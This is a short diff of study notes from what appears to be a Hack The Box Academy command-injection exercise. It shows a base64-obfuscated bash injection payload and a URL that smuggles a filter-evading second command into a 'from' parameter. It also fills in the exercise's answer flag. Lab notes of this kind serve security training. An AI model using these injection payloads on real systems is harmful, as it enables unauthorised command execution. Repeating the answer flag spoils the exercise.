@@ -139,9 +139,9 @@ Payload: `%0abash<<<$({base64,-'d'}<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IG
 
 *Hint: It is always easier to inject our command in an input going at the end of the command, rather than in the middle of it, though both are possible.*
 
+Payload: `https://178.128.46.35:31983/index.php?to=&from=tmp%26%27l%27s%09$%7BPATH:0:1%7Dflag.txt&finish=1&move=1`
 
-
-**Answer:** ``
+**Answer:** `HTB{c0mm4nd3r_1nj3c70r}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
